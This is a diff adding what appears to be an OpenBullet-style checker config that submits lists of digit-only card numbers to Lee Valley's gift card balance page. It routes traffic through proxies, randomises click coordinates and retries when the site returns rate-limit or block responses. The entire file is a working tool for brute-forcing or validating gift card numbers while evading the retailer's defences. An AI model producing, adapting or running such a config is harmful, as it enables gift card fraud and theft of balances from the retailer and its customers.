@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "LeeValley GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-15T20:55:02.4045937+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 2023671766
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "www.leevalley.com/en/home/GCBalance.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "[name=\"__VIEWSTATE\"]" "value" 0 -> VAR "VIEWSTATE" "" "" 
+PARSE "<SOURCE>" CSS "[name=\"__EVENTVALIDATION\"]" "value" 0 -> VAR "EVENTVALIDATION" "" "" 
+FUNCTION URLEncode "<VIEWSTATE>" -> VAR "VIEWSTATE" 
+FUNCTION URLEncode "<EVENTVALIDATION>" -> VAR "EVENTVALIDATION" 
+FUNCTION RandomNum 1 60 "<X>" -> VAR "X" 
+FUNCTION RandomNum 10 150 "<Y>" -> VAR "Y" 
+REQUEST POST "http://www.leevalley.com/en/home/GCBalance.aspx" AutoRedirect=TRUE 
+  CONTENT "__VIEWSTATE=<VIEWSTATE>&__VIEWSTATEGENERATOR=0BEDF79B&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=<EVENTVALIDATION>&_ctl0%3ATop1%3AtxtSearchStringTop=Description+or+Item+%23&_ctl0%3AContentPlaceHolder1%3AtxtGCNumber=<USER>&_ctl0%3AContentPlaceHolder1%3AbtnBalance.x=<X>&_ctl0%3AContentPlaceHolder1%3AbtnBalance.y=<Y>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://www.leevalley.com/en/home/GCBalance.aspx" 
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unable to get balance at this time." 
+    KEY "Invalid Card Number" 
+  KEYCHAIN Retry OR 
+    KEY "Too Many Requests" 
+    KEY "Cache Access Denied." 
+    KEY "<HEADERS{*}>" Contains "Welcome To Zscaler Directory Authentication" 
+    KEY "<ADDRESS>" Contains "http://www.w3.org/TR/REC-html40" 
